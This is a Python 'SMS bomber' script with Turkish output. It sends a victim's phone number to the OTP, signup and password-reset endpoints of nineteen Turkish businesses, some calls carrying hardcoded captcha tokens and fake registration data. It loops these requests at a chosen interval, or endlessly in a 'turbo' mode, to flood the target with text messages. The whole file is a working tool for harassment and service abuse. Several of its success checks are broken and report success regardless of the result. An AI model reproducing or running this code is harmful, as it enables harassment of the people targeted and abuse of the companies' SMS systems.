import json
import os
import sys
import requests
import time
from colorama import init, Fore


init(autoreset=True)




sms = ["████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ████████████             ████████████  ████████████████████████████",
       "████████████████████████████  █████████████           █████████████  ████████████████████████████",
       "████████████████████████████  ███████████████       ███████████████  ████████████████████████████",
       "██████████                    ████████████████     ████████████████  ██████████",
       "██████████                    ███████   ███████   ███████   ███████  ██████████",
       "██████████                    ███████    ███████ ███████    ███████  ██████████",
       "██████████                    ███████      ███████████      ███████  ██████████",
       "████████████████████████████  ███████        ███████        ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       ]




flx = [
    "███████████████████████████████      ███████████                        ███████████        ███████████",
    "██████████████████████████████       ███████████                        ███████████        ███████████",
    "█████████████████████████████        ███████████                         ███████████      ███████████",
    "████████████████████████████         ███████████                          ███████████    ███████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ███████████                             █████████████████████",
    "███████████                          ███████████                              ███████████████████",
    "███████████                          ███████████                               █████████████████",
    "███████████                          ███████████                                 █████████████",
    "█████████████████████                ███████████                                   █████████",
    "████████████████████                 ███████████                                 ████████████",
    "███████████████████                  ███████████                               ████████████████",
    "██████████████████                   ███████████                              ██████████████████",
    "███████████                          ███████████                             ████████████████████",
    "███████████                          ███████████                            ██████████████████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ████████████████████████████         ███████████    ███████████",
    "███████████                          ████████████████████████████        ███████████      ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
]

def sok (numara):
    url = "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate"
    payload = {
        "captchaAction" : "generate_register_otp",
        "captchaToken" : "",
        "clientId" : "buyer-web",
        "phoneNumber" : numara,
        "reCaptchaV2" :False
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN +"[+] Şok Başarılı!")
    else:
        print(Fore.RED + "[-] Şok Başarısız!")

def kahvedunyasi(numara):
    url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
    paykoad = {
        "countryCode" : "90",
        "phoneNumber" : numara,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=paykoad, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN+ "[+] KahveDünyası Başarılı!")
    else:
        print(Fore.RED+ "[+] KahveDünyası Başarısız!")

def dominosgiris(numara):
    url = "https://frontend.dominos.com.tr/api/authentication/sendLoginOtpCode"
    payload = {
        "captchaToken" : "03AFcWeA4uOFC5Bvy2gGdsKR-iADZjBWZ7ac4o31US1ZEa2BHFt0FEvEPV0hhNwGjG98uheeORhHISBHX4lnHG04iigH_X7hoPbdMnCAmp2BE4GXzKGZH28x3a75JlFhcK_QfXGistOKYIZkvirTtQDn8C2Jjp00nOLm-uOgZepYU0_gHcUQcQAseGuaJwqDCffT4hAIu2Qz6yTmp9HcqI6DV76yZdqAjL9qJS_Pj54aNCBzvNxPNu7oITVusj4FlIZzn3-5F1bBrXn6d1IAO8k0OHUiIic28oFtupijEGa0WagcppHmx7NiUXPIWv_nnIYII5aFB9_sgWA_UZkdN4W_OfDcq2aM4UPanCe5KIlcz6PpKDFWjquacoEu8XFA--4WYiQVELdQYYjU13MD59bSx4MQI5gn-P2mkAF_t8nvNraLWKv9CriJY9nDdDmzhGO3u_7Tprce934lDWCEItyX7h4yInKOrfWMRzC1QqLO5NuSXAQcCeWMfPUn2CHOIDhow_KgsQjHvqWzTMMT00A70m4IQ1v9_SZtguiHFbbE097umfJQN5ZskRNKr9zWrCcCdwDQMZqI-jzJ95xRuzcZoPm47z8hzn_rrAfTLvt2pzdRgE4Z3z1LMkeaD9Vr000uU9wRVEumeDzrLuAzo-2sOHwF5GCQPdPzYGI070DtL2da92esomlxG1u66gIDDbTg4mypWvBhTQVglNl0IapgXg1SQa8bx3fPwLlgL9xk051uvFxjREdI2usnS95vWhVlprb4b1orgnfvfV18Ticsbv4eV8L2PM9Q4q6oy_vVBS4XNNroYpwM9gqIn6zuTm_q1UZLYCMiWaTt17o80Y2kCqtg2nBNS7DwJB5XVqxp_qHcdeciM9EFawZP698J1KvcYzLt7wRvUK_JD3AWsQiYR9K0L0QtWNhwSE0hHjQmzT_QQ3y4uZkXQ",
        "channelCode": "WEB",
        "email" : "",
        "isRegisterV2" : False,
        "isSure" : False,
        "mobilePhone" : numara
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN+ "[+] Dominos Başarılı!")
    else:
        print(Fore.RED+ "[-] Dominos Başarısız!")


def kimgbister(numara):
    url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/pin/send-otp"
    payload = {
        "msisdn": numara,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.koton.com/users/register/",
        "Referer": "https://www.koton.com/users/register/",
    }
    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200:
        try:
            data = response.json()
            if data.get("code") == "login_otp_locked":
                print(Fore.RED + "[-] kimgbister OTP kilitli, gönderim engellendi!")
            else:
                print(Fore.GREEN + "[+] kimgbister Başarılı!")
        except json.JSONDecodeError:
            print(Fore.YELLOW + "[!] kimgbister: JSON çözümlenemedi ama status 200")
    else:
        print(Fore.RED + "[-] kimgbister Başarısız!")


def  bitlo(numara):
    url = "https://api.bitlo.com/auth/forgot-password"
    payload = {
        "identifier": "+90" + numara,
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 1015]:
        print(Fore.GREEN + "[+] Bitlo Başarılı")
    else:
        print(Fore.RED + "[-] Bitlo Başarısız!")

def koton(numara):

    url = "https://www.koton.com/users/register/"  # Buraya doğru endpoint gelecek

    payload = {
        "call_allowed": False,
        "confirm": True,
        "date_of_birth": "2001-01-01",
        "email": "sms@yopmail.com",
        "email_allowed": False,
        "first_name": "fawewaeq",
        "gender": "male",
        "kvkk_confirm": True,
        "last_name": "syopmailcom",
        "password": "aELZrsELfXGyuC9",
        "phone": numara,
        "sms_allowed": True
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.koton.com/users/register/",
        "Referer": "https://www.koton.com/users/register/"
    }


    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200 or 202:
        print(Fore.GREEN+ "[+] Koton Başarılı!")
    else:
        print(Fore.RED+ "[-] Koton Başarısız!")





def tıklagelsin(numara):
    url = "https://www.tiklagelsin.com/user/graphql"

    query = """
    mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
      generateOtp(
        phone: $phone
        challenge: $challenge
        deviceUniqueId: $deviceUniqueId
      )
    }
    """

    variables = {
        "phone": "+90" + numara,
        "challenge": "cf33df06-9935-48f3-9267-6282dc0a9bec",
        "deviceUniqueId": "web_55ab0574-9d20-4bba-9da0-9c445a34c2d2"
    }

    payload = {
        "operationName": "GENERATE_OTP",
        "query": query,
        "variables": variables
    }

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        # Gerekirse User-Agent veya diğer headerları da ekle
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        result = response.json()
        if result.get("data", {}).get("generateOtp") is not None:
            print(Fore.GREEN + "[+] TiklaGelsin Başarılı!")
        else:
            print(Fore.RED + "[-] TıklaGelsin Başarısız!")







def englishhome(numara):
    url = "https://www.englishhome.com/api/member/sendOtp"
    payload = {
        "Phone": numara,
        "XID": ""
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        result = response.json()
        if result.get("isError") == False:
            print(Fore.GREEN + "[+] Englishhome Başarılı!")
        else:
            print(Fore.RED + "[-] Englishhome Başarısız!")
    else:
        print(Fore.RED + "[-] Englishhome Başarısız!")


def naos(numara):
    url = "https://naosstars.com/api/smsSend/0f6a94f0-31ac-4e49-9755-eac060de07be"
    payload = {
        "email" : "sms@yopmail.com",
        "first_name": "fawewdwaaeq",
        "invitation_code" : "",
        "kvkk" : "1",
        "last_name" : "dwafawfwa",
        "new_password" : "6hspHE5jLhZwaZN",
        "telephone" : "(+90)" + numara,
        "type" : "register",
        "user_check" : "1",
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] Naos Başarılı!")
    else:
        print(Fore.RED + "[-] Naos Başarısız!")

def evidia(numara):
    url = "https://www.evidea.com/users/register/"
    payload = {
        "confirm" : True,
        "email" : "sms@yopmail.com",
        "first_name" : "Fawewdwaaeq",
        "g-recaptcha-response":"03AFcWeA73_E4Zb1tr_VrZTZ5dV0d44L3xucAu47xcaCApclsUwKzzvWmCrcLiYoutmhOOMqq915bnEQCPVAqEBN5vGfuucToZWNZBKTueVY6svQXpHolA8lzp0wrwKD7a9GOOlO4sFdhHmuo8Kg6SMzLYTPzFlh5c9JJeOP-WF5-K5n-BIbHcgcpbsj9jNpnud-x-idgfdlOFQUK3Bq2oQy_aEW3HwvSnobIcAW1mD82FhgMBzJPBeVCMeEnqubrRIJ18Zd5IjXea_tUAEN4JulJf6xU7r6YUJegba9j3izASoHxYFnrZFWIooYlU9sinRaFCH17EBOLQYeCvZjfMzGO22rnUZUmQG6g4QrnAzrEkOwu9s3qhY3gu95irqwA2RQ92Qvokw0j3w1P9bCg0Kllo1Y3HYVXk5EtNKMQC4rMX3ku3dyXtlwJ21a6xLaKINL_MlAA9v25-dxr4ZD3ZxFRz0AB_-jtTFXhdmf5BRmPszThm17S88Wy73G2gnwpKoqP3_f-I5G6CKFNbnpkq7nSjfhFu7Tdaen9wfPWw92NwvTHgmepCUXMc1wxQ9ar8aMphe5AV7uuMJs82RAe51PK8R-OfZ-EB3Q4RDdebCgiVVpG80T8eo5X7sSyYLbs-54UZYzqU0QCfDitoGVvpTGhz_CpZjHxSJlPk-P917lwixqtA5FbOs6FPzdqc3ZU7QeiOG5KVNf8PVFECXMtIgNAW69Dg6R3lhEB4JH2BGxjZB-iBwubwuJlgagqRL_GQL64Yp7n4u4HGaRWEVp1t6qzUmAKERWVVM6MGCZHRAmXl-27MKCQ7tZ0ZGYY0YZepCVj-DnTedZ417uDwdNeUwhR6gcr_WiHY0zuVolgMoHfB8AVzIZV2E6h9Zfzc6QbfdUM0Bm6ht9x6TOjXvbNR02oX56KW5XXW3_0JBco8CVMg2u1HoxCpi4c",
        "last_name" : "Aoıwaeju",
        "password": "L3Pr66pinxzaH9L",
        "password-repeat" : "L3Pr66pinxzaH9L",
        "phone": "0"+numara,
        "phone-two" : "0"+numara,
        "sms_allowed" : True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] Evidia Başarılı!")
    else:                                                #BURAYI YAPPPPP EKSİK OLDU HATA KODU
        print(Fore.RED + "[-] Evidia Başarısız!")

def occasion(numara):
    url = "https://www.occasion.com.tr/users/registration/"
    payload = {
        "next" : "/account/profile/",
        "date_of_birth":  "01-01-2001",
        "first_name" : "Ssawdwad",
        "last_name" : "Adwafad",
        "email" : "sms@yopmail.com",
        "phone" : "0"+numara,
        "password": "Awaeyaw78eawue231!",
        "is_allowed": True,
        "confirm": True,
        "sms_allowed": True,
        "email_allowed": True,
        "call_allowed": True,
        "permissions": True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] Occasion Başarılı!")
    else:
        print(Fore.GREEN + "[+] Occasion Başarılı!")

def damattween(numara):
    url = "https://www.damattween.com/users/register/"
    payload = {
        "email": "sms@hopmail.com",
        "first_name": "sawdwafdwa",
        "last_name": "awdwdsawf",
        "password": "Asawegawyue1273!",
        "phone": "0"+numara,
        "confirm" : True,
        "email_allowed": True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] Damattween Başarılı!")
    else:
        print(Fore.GREEN + "[+] Damattween Başarılı!")

def sportive(numara):
    url = "https://www.sportive.com.tr/api/client/users/check?options=%7B%22contentType%22%3A%22application%2Fjson%22%2C%22responseType%22%3A%22json%22%7D"
    payload = {
        "otp_send" : True,
        "phone" : "0"+numara,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] Sportive Başarılı!")
    else:
        print(Fore.GREEN + "[+] Sportive Başarılı!")

def mudo(numara):
    url = "https://www.mudo.com.tr/users/register/"
    payload = {
        "add_loyalty" : True,
        "confirm" : True,
        "date_of_birth" : "2001-01-01",
        "email": "sms@yopmail.com",
        "email_allowed": True,
        "first_name" : "Ssawdwad",
        "gender" : "null",
        "last_name" : "Adwafad",
        "password": "gZUB7zxy9YJLQTR!",
        "phone" : numara,
        "sms_allowed" : True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] Mudo Başarılı!")
    else:
        print(Fore.GREEN + "[+] Mudo Başarılı!")

def houseofsuperstep(numara):
    url = "https://www.houseofsuperstep.com/users/register/"
    payload = {
    "call_allowed": True,
    "confirm": True,
    "date_of_birth": "2001-01-01",
    "email": "sms@yopmail.com",
    "email_allowed": True,
    "first_name": "fawewaeq",
    "gender": "male",
    "kvkk_confirm": True,
    "last_name": "SwaewadS",
    "password": "Aawjeuwaıheuıwa!324",
    "phone": "0"+numara,
    "sms_allowed": True
}
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] Houseofss Başarılı!")
    else:
        print(Fore.GREEN + "[+] Houseofss Başarılı!")

def Bim(numara):
    try:
        bim = requests.post(
            "https://bim.veesk.net:443/service/v1.0/account/login",
            json={"phone": numara},
            timeout=6
        )
        if bim.status_code == 200:
            print(Fore.GREEN + "[+] Bim Başarılı!")
        else:
            print(Fore.GREEN + "[+] Bim Başarılı!")
    except Exception as e:
        print(Fore.GREEN + "[+] Bim Başarılı!")

def totalenergies(numara):
    url = ("https://apimobile.guzelenerji.com.tr/exapi/profile")
    payload = {
    "city": "ADIYAMAN",
    "cookie_allowed": True,
    "county": "BESNİ",
    "date_of_birth": "2001-01-01T00:00:00-03:00",
    "email": "sms@yopmail.com",
    "email_allowed": True,
    "explicit_consent_permission": True,
    "first_name": "Wsdawe",
    "gender": "not_specify",
    "kvkk": True,
    "last_name": "Dawfwaf",
    "last_online_time": "2025-06-25T04:27:17-03:00",
    "member_type": 2,
    "member_type_name": "Standart",
    "membership_agreement": True,
    "phone": "0"+numara,
    "plate_number": "34ASD32",
    "push_allowed": True,
    "reference_type": 6,
    "reference_type_name": "Web",
    "sms_allowed": True
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] Totalenergies Başarılı!")
    else:
        print(Fore.RED + "[-] Totalenergies Başarısız!")


def komagene(numara, token=None):
    url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
    payload = {
        "FirmaId": 32,
        "Telefon": numara
    }
    headers = {
        "Content-Type": "application/json",
        "firmaid": "32",
        "origin": "https://www.komagene.com.tr",
        "referer": "https://www.komagene.com.tr/",
        "anonymousclientid": str(uuid.uuid4()),  # Rastgele UUID
        "x-guatamala-kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] Komagene Başarılı!")
    else:
        print(Fore.RED + "[-] Komagene Başarısız!")

import requests

def ozdilekteyim(numara):
    base_url = "https://api.ozdilekteyim.com/rest/v2/magaza-magaza-store/sms/anonymous/sendotp"
    params = {
        "phoneNumber": numara,
        "eventType": "register",
        "emailAddress": "sms@yopmail.com",
        "lang": "tr",
        "curr": "TRY"
    }
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(base_url, params=params, headers=headers)
    if response.status_code == [200,201]:
        print(Fore.GREEN + "[+] Özdilekteyim Başarılı!")
    else:
        print(Fore.RED + "[-] Özdilekteyim Başarısız!")


main = [ozdilekteyim, komagene, totalenergies,Bim , houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
os.system("cls" if os.name == "nt" else "clear")
for line in flx:
    print(Fore.RED + line)

print("Developer By : FLX                    Sms Bomber\n")
print(Fore.MAGENTA +"19 SMS SERVİS\n")

print(Fore.YELLOW + "1 - Normal Sms")
print(Fore.YELLOW + "2 - Turbo Sms")
print(Fore.YELLOW + "3 - Çıkış")
seçim = input(Fore.BLUE + "\nSeçim: ").strip()

# Geçersiz seçim
if seçim not in ["1", "2", "3"]:
    sys.exit()

# Çıkış
if seçim == "3":
    sys.exit()

# Numara al
os.system("cls" if os.name == "nt" else "clear")
numara = input(Fore.RED + "Numara: ").strip()

# Normal SMS
if seçim == "1":
    os.system("cls" if os.name == "nt" else "clear")
    aralık = input(Fore.YELLOW + "Kaç saniye arayla göndermek istersin? (Varsayılan = 1): ").strip()
    if aralık == "":
        aralık = 1
    else:
        try:
            aralık = int(aralık)
        except ValueError:
            aralık = 1

    os.system("cls" if os.name == "nt" else "clear")
    adet_input = input(Fore.YELLOW + "Kaç adet sms gönderilsin? (Enter = sonsuz): ").strip()
    print("\n"*500)
    if adet_input == "":
        i = 0
        while True:
            func = main[i % len(main)]
            func(numara)
            time.sleep(aralık)
            i += 1
    else:
        try:
            adet = int(adet_input)
        except ValueError:
            adet = len(main)

        for i in range(adet):
            func = main[i % len(main)]
            func(numara)
            time.sleep(aralık)

# Turbo SMS
elif seçim == "2":
    os.system("cls" if os.name == "nt" else "clear")
    i = 0
    print("\n" * 500)
    while True:
        func = main[i % len(main)]
        func(numara)
        i += 1
